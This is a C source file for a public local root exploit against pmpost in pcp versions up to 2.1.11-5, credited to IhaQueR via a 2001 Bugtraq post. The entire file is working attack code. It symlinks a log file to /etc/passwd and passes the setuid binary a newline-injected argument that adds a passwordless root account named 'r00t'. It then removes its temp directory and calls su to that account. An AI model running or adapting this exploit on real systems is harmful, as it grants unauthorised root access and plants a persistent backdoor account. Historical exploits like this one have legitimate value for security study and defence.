/********************************************************
*                                                       *
*               pmpost local root exploit               *
*               vulnerable: pcp <= 2.1.11-5             *
*               by IhaQueR                              *
*                                                       *
* From: Paul Starzetz <paul@starzetz.de>
* Via: bugtraq@securityfocus.com
* Date: Mon, 18 Jun 2001 19:11:20 +0200
*
* Usage: pmpost-exploit path-to-pmpost
*
********************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>

int
main(int argc, char **argv)
{
    const char	*bin=argv[1];
    static char buf[512];
    static char dir[128];
    int		sts;

    if (argc != 2) {
	fprintf(stderr, "Usage: %s path-to-pmpost\n", argv[0]);
	exit(1);
    }

    srand(time(NULL));
    sprintf(dir, "/tmp/dupa.%.8d", rand());

    if(mkdir(dir, S_IRWXU)) {
	fprintf(stderr, "%s: Error: mkdir \"%s\": %s\n", argv[0], dir, strerror(errno));
	exit(2);
    }

    if(chdir(dir)) {
	fprintf(stderr, "%s: Error: chdir \"%s\": %s\n", argv[0], dir, strerror(errno));
	exit(3);
    }

    if(symlink("/etc/passwd", "./NOTICES")) {
	fprintf(stderr, "%s: Error: symlink: %s\n", argv[0], strerror(errno));
	exit(4);
    }

    sprintf(buf, "PCP_LOG_DIR=%.500s", dir);

    if(putenv(buf)) {
	fprintf(stderr, "%s: Error: putenv \"%s\": %s\n", argv[0], buf, strerror(errno));
	exit(5);
    }

    sts = fork();
    if(sts == 0) {
	/*
	 * child, append to /etc/passwd!
	 */
	execl(bin, bin, "\nr00t::0:0:root:/root:/bin/sh", NULL);
	fprintf(stderr, "%s: Error: execl: \"%s\": %s\n", argv[0], bin, strerror(errno));
	exit(1);
    }
    else if (sts > 0) {
	/*
	 * parent, wait and now a root shell, please
	 */
	waitpid(0, NULL, WUNTRACED);
	if (chdir("..")) {
	    fprintf(stderr, "%s: Error: chdir \"..\": %s\n", argv[0], strerror(errno));
	    exit(3);
	}
	sprintf(buf, "rm -rf dupa.*");
	if ((sts = system(buf)) != 0) {
	    fprintf(stderr, "%s: Error: %s: exit status %d\n", argv[0], buf, sts);
	    exit(3);
	}
	execl("/bin/su", "/bin/su", "r00t", "-c", "id", NULL);
    }
    else {
	fprintf(stderr, "%s: Error: fork: %s\n", argv[0], strerror(errno));
	exit(6);
    }

    exit(0);
}
